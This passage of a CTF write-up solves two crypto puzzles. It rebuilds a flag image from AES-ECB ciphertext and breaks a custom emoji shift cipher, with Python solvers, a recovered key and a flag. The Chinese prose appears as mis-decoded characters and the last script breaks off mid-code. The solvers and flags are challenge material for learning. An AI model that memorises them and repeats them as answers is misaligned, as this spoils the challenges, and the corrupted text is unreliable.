<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å®‰å…¨çš„åŠ å¯†"><a href="#å®‰å…¨çš„åŠ å¯†" class="headerlink" title="å®‰å…¨çš„åŠ å¯†"></a>å®‰å…¨çš„åŠ å¯†</h3><p>é€™é¡Œå±•ç¤ºäº†ç‚ºä»€éº¼ ECB åŠ å¯†æ¨¡å¼ä¸é©åˆç”¨æ–¼åœ–åƒè³‡æ–™ã€‚</p>
<ul>
<li>åŠ å¯†æ©Ÿåˆ¶åˆ†æ<br><img src="/img/FhCTF/29.webp" alt="image"></li>
</ul>
<p>é¡Œç›®ä½¿ç”¨è…³æœ¬å°‡ flag è½‰æ›ç‚º BMP åœ–æª”å¾Œï¼Œå†é€é AES-256-ECB åŠ å¯†ã€‚ç‰¹åˆ¥çš„æ˜¯ï¼ŒåŠ å¯†é‡‘é‘°ç›´æ¥å¾ flag çš„åå…­é€²ä½è¡¨ç¤ºå–å¾—ã€‚ç”±æ–¼ OpenSSL çš„ <code>enc</code> æŒ‡ä»¤åœ¨é‡‘é‘°é•·åº¦ä¸è¶³æ™‚æœƒè‡ªå‹•å¡«å……é›¶ä½å…ƒçµ„è‡³ 32 bytesï¼Œå¯¦éš›åŠ å¯†éç¨‹ä¸­çš„é‡‘é‘°æ˜¯å¯é æ¸¬çš„ã€‚</p>
<ul>
<li>æ”»æ“Šå‘é‡</li>
</ul>
<p>ECB æœ€è‡´å‘½çš„å¼±é»åœ¨æ–¼ç›¸åŒæ˜æ–‡å€å¡Šç¸½æ˜¯ç”¢ç”Ÿç›¸åŒå¯†æ–‡å€å¡Šã€‚ç•¶åŠ å¯†å°è±¡æ˜¯çµæ§‹åŒ–è³‡æ–™ï¼ˆå¦‚åœ–åƒï¼‰æ™‚ï¼Œé€™å€‹ç‰¹æ€§æœƒç›´æ¥æš´éœ²è³‡æ–™çš„ç©ºé–“åˆ†å¸ƒæ¨¡å¼ã€‚</p>
<ul>
<li>è§£å¯†æ­¥é©Ÿ</li>
</ul>
<p>ç”±æ–¼åœ–æª”æ ¼å¼ç‚º 1000Ã—100 åƒç´ çš„ 32-bit BMPï¼Œæ¯å€‹åƒç´ ä½” 4 bytesï¼Œç¸½å…± 400,000 bytesã€‚AES ä»¥ 16-byte ç‚ºå–®ä½åˆ†å¡ŠåŠ å¯†ï¼Œå°æ‡‰åˆ°åœ–åƒä¸­å°±æ˜¯æ¯ 4 å€‹åƒç´ ç‚ºä¸€çµ„ã€‚</p>
<p>é€éä»¥ä¸‹æ­¥é©Ÿé‡å»ºåœ–åƒï¼š</p>
<ul>
<li>è®€å–åŠ å¯†æª”æ¡ˆä¸¦æŒ‰ 16-byte åˆ‡åˆ†æˆå€å¡Š</li>
<li>è·³é BMP æ¨™é ­ä½”ç”¨çš„å‰ 138 bytesï¼ˆç´„ 9 å€‹å€å¡Šï¼‰</li>
<li>å°‡æ¯å€‹åŠ å¯†å€å¡Šè¦–ç‚ºä¸€å€‹é¡è‰²å–®å…ƒ</li>
<li>é‡æ–°æ’åˆ—æˆ 250Ã—100 çš„å€å¡Šé™£åˆ—ï¼ˆ1000Ã·4&#x3D;250ï¼‰</li>
<li>ç‚ºä¸åŒçš„å¯†æ–‡å€å¡ŠæŒ‡æ´¾ä¸åŒé¡è‰²é€²è¡Œè¦–è¦ºåŒ–</li>
</ul>
<p>ç”±æ–¼æ–‡å­—å€åŸŸå’ŒèƒŒæ™¯å€åŸŸçš„åƒç´ å€¼ä¸åŒï¼ŒåŠ å¯†å¾Œæœƒç”¢ç”Ÿæˆªç„¶ä¸åŒçš„å¯†æ–‡å€å¡Šã€‚é€éé¡è‰²æ˜ å°„ï¼Œæ–‡å­—çš„è¼ªå»“æœƒæ¸…æ™°å‘ˆç¾ï¼Œç›´æ¥è®€å–å³å¯å¾—åˆ° flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¨­å®š</span></span><br><span class="line">ENC_FILE = <span class="string">&quot;flag.enc&quot;</span></span><br><span class="line">OUTPUT_DIR = <span class="string">&quot;results&quot;</span></span><br><span class="line">MIN_WIDTH = <span class="number">200</span>  <span class="comment"># æ ¹æ“šç¶“é©—æˆ–æ¸¬è©¦èª¿æ•´ç¯„åœ</span></span><br><span class="line">MAX_WIDTH = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. è®€å–åŠ å¯†æª”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(ENC_FILE, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. åˆ‡åˆ†å€å¡Š (AES Block Size = 16 bytes)</span></span><br><span class="line">    block_size = <span class="number">16</span></span><br><span class="line">    blocks = [content[i:i+block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), block_size)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. æ‰¾å‡ºèƒŒæ™¯ (é »ç‡æœ€é«˜çš„å€å¡Š)</span></span><br><span class="line">    counts = Counter(blocks)</span><br><span class="line">    most_common_block = counts.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. è½‰æ›ç‚º 0/1 Map (1=èƒŒæ™¯, 0=æ–‡å­—)</span></span><br><span class="line">    pixel_map = [<span class="number">1</span> <span class="keyword">if</span> b == most_common_block <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> b <span class="keyword">in</span> blocks]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(OUTPUT_DIR):</span><br><span class="line">        os.makedirs(OUTPUT_DIR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. æš´åŠ›æšèˆ‰å¯¬åº¦ä¸¦ç¹ªåœ–</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Generating images from width <span class="subst">&#123;MIN_WIDTH&#125;</span> to <span class="subst">&#123;MAX_WIDTH&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(MIN_WIDTH, MAX_WIDTH + <span class="number">1</span>):</span><br><span class="line">        height = <span class="built_in">len</span>(pixel_map) // width + <span class="number">1</span></span><br><span class="line">        img = Image.new(<span class="string">&#x27;1&#x27;</span>, (width, height), <span class="number">1</span>)</span><br><span class="line">        pixels = img.load()</span><br><span class="line">        </span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                    <span class="keyword">if</span> idx &lt; <span class="built_in">len</span>(pixel_map):</span><br><span class="line">                        <span class="comment"># å¦‚æœä¸æ˜¯èƒŒæ™¯(0)ï¼Œå°±ç•«é»‘é»</span></span><br><span class="line">                        <span class="keyword">if</span> pixel_map[idx] == <span class="number">0</span>:</span><br><span class="line">                            pixels[x, y] = <span class="number">0</span> </span><br><span class="line">                        idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line">        img.save(<span class="string">f&quot;<span class="subst">&#123;OUTPUT_DIR&#125;</span>/width_<span class="subst">&#123;width&#125;</span>.webp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/img/FhCTF/30.webp" alt="image"></p>
<p>æˆ‘å€‘å¯ä»¥çœ‹åˆ°æ˜¯åéä¾†çš„<code>FhCTF&#123;3C13_m0d3_1s_z0_S3cur17y_&#125;</code><br><img src="/img/FhCTF/31.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;3C13_m0d3_1s_z0_S3cur17y_&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Encode-By-Py-ğŸ˜˜"><a href="#Encode-By-Py-ğŸ˜˜" class="headerlink" title="Encode By Py ğŸ˜˜"></a>Encode By Py ğŸ˜˜</h3><p><img src="/img/FhCTF/32.webp" alt="image"></p>
<p>é€™é¡Œçš„æ ¸å¿ƒæ˜¯ã€Œè‡ªè£½ Emoji åŠ å¯†ã€å…¶å¯¦åªæ˜¯ä¸€å€‹å¯é€†çš„ä½ç§»ç·¨ç¢¼ï¼ŒåŠ ä¸Šå¯é æ¸¬çš„ key å¾ªç’°èˆ‡å¤§é‡é‡è¤‡æ¨£æœ¬ï¼Œæ•´é«”å®‰å…¨æ€§éå¸¸è„†å¼±ã€‚</p>
<ul>
<li><p>æ•´é«”æµç¨‹æ¦‚è¦½</p>
<ul>
<li>ç¨‹å¼å•Ÿå‹•æ™‚æœƒè¼‰å…¥ä¸€çµ„é‡‘é‘°å­—ä¸² <code>ENC_SECRET</code>ï¼Œé è¨­å€¼æ˜¯ <code>Hi_S3cL157_xato-net</code>ï¼Œç„¶å¾Œè®€å– <code>flag.txt</code> çš„å…§å®¹ä½œç‚ºæ˜æ–‡ã€‚  </li>
<li>ä¸»é‚è¼¯åœ¨ <code>encrypt_bytes</code>ï¼Œé€ byte è™•ç†è¼¸å…¥ï¼Œå°‡æ¯å€‹ byte è½‰æˆå°æ‡‰çš„ Emojiï¼Œæœ€å¾Œå¯«å‡ºåˆ° <code>flag.enc</code>ã€‚  </li>
<li>ç·¨ç¢¼æ™‚ä½¿ç”¨å›ºå®š baseï¼ˆ<code>BASE = 0x1F600</code>ï¼‰å’Œç¯„åœï¼ˆ<code>RANGE = 0x4E</code>ï¼‰ï¼Œæ‰€ä»¥çµæœéƒ½è½åœ¨ä¸€å°æ®µ Emoji codepoint å€é–“ã€‚</li>
</ul>
</li>
<li><p>å–®ä¸€ byte çš„ Emoji ç·¨ç¢¼</p>
<ul>
<li>å°æ¯å€‹æ˜æ–‡å­—ç¯€ <code>byte</code>ï¼Œå…ˆè¨ˆç®—ç•¶å‰ç´¢å¼• <code>i</code> å°æ‡‰åˆ° key çš„ä½ç½® <code>idx</code>ï¼Œç”¨ <code>ENC_SECRET[idx]</code> åšä½ç§»ï¼Œå†æ­é… XOR ç”¢ç”Ÿä¸€å€‹åç§»é‡ <code>enc_shift</code>ã€‚  </li>
<li>çœŸæ­£è¼¸å‡ºçš„å€¼æ˜¯<br>[<br>enc_byte &#x3D; ((byte + (enc_shift \oplus RANGE)) \bmod RANGE) + BASE<br>]<br>å¦‚æœè½åœ¨ç‰¹å®šä¿ç•™å€é–“å‰‡å†æ¸›å» <code>ALTERNATIVE</code> åšä¿®æ­£ï¼Œç¢ºä¿æœ€å¾Œæ˜¯åˆæ³• UTF-8 Emojiã€‚  </li>
<li>æŸäº›ç‰¹æ®Š byteï¼ˆä¾‹å¦‚æ›è¡Œï¼‰ä¸æœƒè½‰æˆ Emojiï¼Œè€Œæ˜¯ã€ŒåŸæ¨£è¼¸å‡ºã€ï¼Œä¸¦ä¸”ç”¨ä¾†é©…å‹•é•·åº¦ç›¸é—œçš„è¨ˆæ•¸è®Šæ•¸ï¼Œå½±éŸ¿å¾Œé¢ <code>idx</code> çš„è¨ˆç®—ã€‚</li>
</ul>
</li>
<li><p>ç´¢å¼•å¾ªç’°èˆ‡è¡Œç‚ºåˆ†æ</p>
<ul>
<li>key çš„ä½¿ç”¨ä½ç½®ä¸æ˜¯å–®ç´” <code>i % len(ENC_SECRET)</code>ï¼Œè€Œæ˜¯ <code>i % ((len_num * len_times) if len_num &gt; 0 else 1)</code>ï¼Œå…¶ä¸­ <code>len_num</code>ã€<code>len_times</code> åªåœ¨ç¢°åˆ°ç‰¹å®š byteï¼ˆå¯¦éš›ä¸Šå°±æ˜¯é‚£å€‹ã€Œif byte &#x3D;&#x3D; æŸå€¼å°±åŸæ¨£è¼¸å‡ºã€çš„æ¢ä»¶ï¼‰æ™‚æ‰æœƒæ›´æ–°ã€‚  </li>
<li>é€™ä»£è¡¨æ•´å€‹åŠ å¯†éç¨‹æ˜¯ã€Œè¢«åˆ†æ®µçš„ã€ï¼šæ¯æ¬¡é‡åˆ°é‚£å€‹ç‰¹æ®Šæ§åˆ¶å­—å…ƒï¼ˆä¾‹å¦‚æ›è¡Œï¼‰å°±æœƒé‡è¨­æˆ–æ”¹è®Šå¾ªç’°é•·åº¦ï¼Œå°è‡´æ¯ä¸€è¡Œçš„ key index pattern ä¸åŒã€‚  </li>
<li>æª”æ¡ˆè£¡ç¬¬ä¸€å¤§æ®µé‡è¤‡çš„ <code>âœ…ğŸ˜¢ğŸ™ˆğŸ˜´</code> ç­‰ emojiï¼Œå…¶å¯¦å°±æ˜¯åˆ©ç”¨åŒä¸€å€‹æ˜æ–‡å­—ç¯€åè¦†å‡ºç¾ï¼Œè®“å°æ‡‰çš„ key ä½ç½®é‡è¤‡ï¼Œæˆç‚ºæ”»æ“Šè€…è§€å¯Ÿ key çš„çµ•ä½³æ¨£æœ¬ã€‚</li>
</ul>
</li>
<li><p>è§£å¯†é‚è¼¯çš„é€†å‘è¨­è¨ˆ</p>
<ul>
<li>è¦é‚„åŸæ˜æ–‡ï¼Œç¬¬ä¸€æ­¥æ˜¯æŠŠæ¯å€‹ Emoji è½‰å› Unicode codepointï¼Œå¦‚æœæ˜¯ã€Œè¢«æŒªåˆ°æ›¿ä»£å€æ®µã€çš„ï¼Œå°±åŠ å› <code>ALTERNATIVE</code>ï¼Œå†æ¸›æ‰ <code>BASE</code>ï¼Œå¾—åˆ°åŸæœ¬çš„ã€Œæ¨¡ RANGE ä¹‹å‰çš„åŠ å¯†å€¼ã€ã€‚  </li>
<li>æ¥è‘—ï¼Œç”¨åŒæ¨£çš„ key byte å’Œä½ç§»è¦å‰‡ï¼ŒæŠŠ(enc_byteâˆ’BASE)modRANGE<br>åæ¨å›bytemodRANGE<br>å› ç‚ºé‹ç®—ä¸­æœ‰ <code>% RANGE</code>ï¼Œæ‰€ä»¥ç†è«–ä¸Šåªèƒ½æ¢å¾©ã€Œ0..77 çš„æ˜æ–‡æ¨¡å€¼ã€ï¼Œä½†å°é€™é¡Œä¾†èªªï¼Œflag è¢«æ˜ å°„åˆ°ä¸€å€‹æœ‰é™å­—å…ƒé›†åˆï¼ˆASCII artï¼‰ä¸­ï¼Œé€™æ¨£çš„è³‡è¨Šå·²ç¶“è¶³å¤ è¾¨è­˜ã€‚  </li>
<li>å¯¦ä½œä¸Šå°±æ˜¯ï¼š  <ul>
<li>é‚„åŸå‡ºæ¯å€‹ä½ç½®å°æ‡‰çš„ <code>enc_shift</code>ã€‚  </li>
<li>ç”¨åŠ å¯†å…¬å¼åå‘æ±‚è§£åŸå§‹ byte åœ¨ <code>0..77</code> çš„å€¼ã€‚  </li>
<li>æŠŠé€™äº›å€¼æ˜ å°„åˆ°ä¸€çµ„å¯è¦–å­—å…ƒè¡¨ï¼ˆä¾‹å¦‚å›ºå®šé †åºçš„ ASCII å­—å…ƒï¼‰ä¸Šï¼Œå¾—åˆ°å¯è®€å…§å®¹ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p>åˆ©ç”¨é‡è¤‡è¡Œæ¢å¾©é‡‘é‘°</p>
<ul>
<li>é¡Œç›®çµ¦çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€é•·ä¸²å®Œå…¨è¦å¾‹é‡è¤‡çš„ emoji patternï¼Œæœ¬è³ªä¸Šå°æ‡‰åŒä¸€å€‹æ˜æ–‡å­—å…ƒï¼ˆä¾‹å¦‚ç©ºç™½æˆ–æŸå€‹å›ºå®šç¬¦è™Ÿï¼‰ï¼Œç›¸ç•¶æ–¼ã€Œå·²çŸ¥æ˜æ–‡å¤§é‡é‡è¤‡ã€ã€‚  </li>
<li>å°æ¯å€‹é‡è¤‡ä½ç½®ï¼Œå·²çŸ¥ï¼š  <ul>
<li>ç›¸åŒæ˜æ–‡å­—ç¯€ <code>byte</code>ã€‚  </li>
<li>å°æ‡‰ emoji çš„ codepointï¼ˆå³ <code>enc_byte</code>ï¼‰ã€‚  </li>
<li><code>BASE</code> èˆ‡ <code>RANGE</code> ç‚ºå¸¸æ•¸ã€‚</li>
</ul>
</li>
<li>æ–¼æ˜¯å¯ä»¥ç›´æ¥æŠŠæ–¹ç¨‹å¼ä¸­çš„ <code>ENC_SECRET[idx]</code> åæ¨å›ä¾†ï¼Œé€å€‹ä½ç½®è§£å‡º key çš„æ¯å€‹ byteï¼Œæœ€å¾Œå¾—åˆ°é•·åº¦ç‚º 12 çš„ keyï¼š<br><code>[49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]</code><br>ä¸¦ä¸”ç¢ºèªé€™çµ„éµå€¼æœƒåœ¨æ•´æ®µå¯†æ–‡ä¸­é€±æœŸæ€§é‡è¤‡ã€‚  </li>
<li>æœ‰äº†å®Œæ•´ keyï¼Œå³å¯å°æ¯å€‹ emoji é€²è¡Œä¸Šè¿°çš„é€†é‹ç®—ï¼ŒæŠŠæ•´å€‹ <code>flag.enc</code> è½‰å›ã€Œmod 78 æ˜æ–‡ã€åºåˆ—ã€‚</li>
</ul>
</li>
<li><p>é‚„åŸ ASCII art èˆ‡ flag</p>
<ul>
<li>è§£ç¢¼å¾Œå¾—åˆ°çš„ä¸¦ä¸æ˜¯ç›´æ¥çš„ä¸€è¡Œ flagï¼Œè€Œæ˜¯ä¸€å€‹ç”±å¯è¦–å­—å…ƒæ§‹æˆçš„å¤§å‹ ASCII artï¼Œé¢¨æ ¼èˆ‡ FIGlet è¼¸å‡ºçš„å­—å‹ä¸€è‡´ã€‚  </li>
<li>æŠŠé‚„åŸå‡ºçš„å­—å…ƒé™£åˆ—ä¾ç…§åŸå§‹æ›è¡Œé…ç½®è¼¸å‡ºï¼Œå°±èƒ½çœ‹åˆ°ä¸€å€‹å¤§å­—æ¨£ï¼Œè£¡é¢åµŒè‘—å½¢å¦‚ <code>flag&#123;...&#125;</code> çš„å…§å®¹ã€‚  </li>
<li>å°‡é€™æ®µ ASCII art è½‰æˆåœ–ç‰‡æˆ–ç›´æ¥åœ¨ç­‰å¯¬å­—å‹çµ‚ç«¯æ©Ÿä¸­è§€çœ‹ï¼Œè‚‰çœ¼å°±å¯ä»¥è¾¨èªå‡ºçœŸæ­£çš„ flagã€‚æ•´å€‹éç¨‹åªåˆ©ç”¨ï¼š  <ul>
<li><p>æ¼”ç®—æ³•å¯é€†æ€§ã€‚  </p>
</li>
<li><p>é«˜åº¦é‡è¤‡çš„å·²çŸ¥æ˜æ–‡è¡Œã€‚  </p>
</li>
<li><p>æœ‰é™å­—å…ƒé›†åˆå°è‡´çš„æ¨¡ç©ºé–“ç¸®å°ã€‚é€™ä¹Ÿèªªæ˜äº†ã€ŒEmoji + ä½å…ƒé‹ç®—ã€ä¸¦ä¸æœƒè‡ªå‹•å¸¶ä¾†ä»»ä½•é¡å¤–å®‰å…¨æ€§ï¼Œåªæ˜¯å¦ä¸€ç¨®æ›çš®çš„å¤å…¸å¯†ç¢¼è€Œå·²ã€‚  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸æ•¸å®šç¾©</span></span><br><span class="line">BASE = <span class="number">0x1F600</span></span><br><span class="line">RANGE = <span class="number">0x4E</span></span><br><span class="line">ALTERNATIVE = <span class="number">0x1CEFE</span></span><br><span class="line">KEY = [<span class="number">49</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">19</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">23</span>, <span class="number">22</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å»ºç«‹æ•¸å€¼åˆ°å­—å…ƒçš„æ˜ å°„è¡¨</span></span><br><span class="line">VAL_TO_CHAR = &#123;</span><br><span class="line">    <span class="number">14</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="number">18</span>: <span class="string">&quot;`&quot;</span>,</span><br><span class="line">    <span class="number">32</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">    <span class="number">33</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">    <span class="number">39</span>: <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">    <span class="number">40</span>: <span class="string">&quot;(&quot;</span>,</span><br><span class="line">    <span class="number">41</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">    <span class="number">44</span>: <span class="string">&quot;,&quot;</span>,</span><br><span class="line">    <span class="number">45</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="number">46</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    <span class="number">47</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="number">58</span>: <span class="string">&quot;:&quot;</span>,</span><br><span class="line">    <span class="number">60</span>: <span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_encrypted_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è®€å–ä¸¦è§£æåŠ å¯†çš„ emoji æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">    raw_data = Path(file_path).read_bytes()</span><br><span class="line">    text = raw_data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tokens = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot;\n&quot;</span>:</span><br><span class="line">            tokens.append((<span class="string">&quot;newline&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            codepoint = <span class="built_in">ord</span>(char)</span><br><span class="line">            <span class="keyword">if</span> codepoint &lt; BASE:</span><br><span class="line">                codepoint += ALTERNATIVE</span><br><span class="line">            tokens.append((<span class="string">&quot;char&quot;</span>, codepoint - BASE))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tokens</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_index_sequence</span>(<span class="params">tokens</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å»ºç«‹ç´¢å¼•åºåˆ—ç”¨æ–¼è§£å¯†&quot;&quot;&quot;</span></span><br><span class="line">    line_length = <span class="number">0</span></span><br><span class="line">    line_count = <span class="number">0</span></span><br><span class="line">    index_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (token_type, _) <span class="keyword">in</span> <span class="built_in">enumerate</span>(tokens):</span><br><span class="line">        idx = i % (line_length * line_count) <span class="keyword">if</span> line_length &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        index_list.append(idx)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> token_type == <span class="string">&quot;newline&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> line_length == <span class="number">0</span>:</span><br><span class="line">                line_length = i + <span class="number">1</span></span><br><span class="line">            line_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> index_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_tokens</span>(<span class="params">tokens, index_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è§£å¯† token åºåˆ—&quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(tokens)</span><br><span class="line">    plaintext_mod = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (token_type, value) <span class="keyword">in</span> <span class="built_in">enumerate</span>(tokens):</span><br><span class="line">        <span class="keyword">if</span> token_type == <span class="string">&quot;newline&quot;</span>:</span><br><span class="line">            plaintext_mod.append(<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        key_value = KEY[index_list[i] % <span class="built_in">len</span>(KEY)]</span><br><span class="line">        shift = (length - i) % <span class="number">4</span></span><br><span class="line">        decrypted_value = (value - (key_value &lt;&lt; shift)) % RANGE</span><br><span class="line">        plaintext_mod.append(decrypted_value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_ascii_art</span>(<span class="params">plaintext_mod</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°‡è§£å¯†å¾Œçš„æ•¸å€¼è½‰æ›ç‚º ASCII è—è¡“å­—å…ƒ&quot;&quot;&quot;</span></span><br><span class="line">    ascii_chars = []</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> plaintext_mod:</span><br><span class="line">        <span class="keyword">if</span> value == <span class="number">10</span>:</span><br><span class="line">            ascii_chars.append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ascii_chars.append(VAL_TO_CHAR.get(value, <span class="string">&quot;?&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(ascii_chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_ascii_art_to_image</span>(<span class="params">ascii_text, output_path, font_size=<span class="number">16</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°‡ ASCII è—è¡“æ¸²æŸ“æˆåœ–ç‰‡&quot;&quot;&quot;</span></span><br><span class="line">    lines = ascii_text.splitlines()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å˜—è©¦è¼‰å…¥å­—é«”</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        font = ImageFont.truetype(<span class="string">&quot;consola.ttf&quot;</span>, font_size)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            font = ImageFont.truetype(<span class="string">&quot;Courier New.ttf&quot;</span>, font_size)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            font = ImageFont.load_default()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¨ˆç®—åœ–ç‰‡å°ºå¯¸</span></span><br><span class="line">    max_line_length = <span class="built_in">max</span>(<span class="built_in">len</span>(line) <span class="keyword">for</span> line <span class="keyword">in</span> lines) <span class="keyword">if</span> lines <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    char_width = font.getbbox(<span class="string">&quot;A&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    line_height = font.getbbox(<span class="string">&quot;A&quot;</span>)[<span class="number">3</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    image_width = max_line_length * char_width + <span class="number">10</span></span><br><span class="line">    image_height = line_height * <span class="built_in">len</span>(lines) + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å»ºç«‹åœ–ç‰‡ä¸¦ç¹ªè£½æ–‡å­—</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (image_width, image_height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line"></span><br><span class="line">    y_position = <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        draw.text((<span class="number">5</span>, y_position), line, fill=<span class="string">&quot;black&quot;</span>, font=font)</span><br><span class="line">        y_position += line_height</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å„²å­˜åœ–ç‰‡</span></span><br><span class="line">    img.save(output_path)</span><br><span class="line">    <span class="keyword">return</span> output_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸»ç¨‹å¼æµç¨‹&quot;&quot;&quot;</span></span><br><span class="line">    input_file = Path(<span class="string">r&quot;C:\Users\zenge\Downloads\files (6)\flag.enc&quot;</span>)</span><br><span class="line">    output_file = Path(<span class="string">r&quot;C:\Users\zenge\Downloads\files (6)\ascii_art.webp&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 1: è§£æåŠ å¯†æª”æ¡ˆ</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è§£æåŠ å¯†æª”æ¡ˆ...&quot;</span>)</span><br><span class="line">    tokens = parse_encrypted_file(input_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 2: å»ºç«‹ç´¢å¼•åºåˆ—</span></span><br><span class="line">    <span class="built_in">print</span>(<span 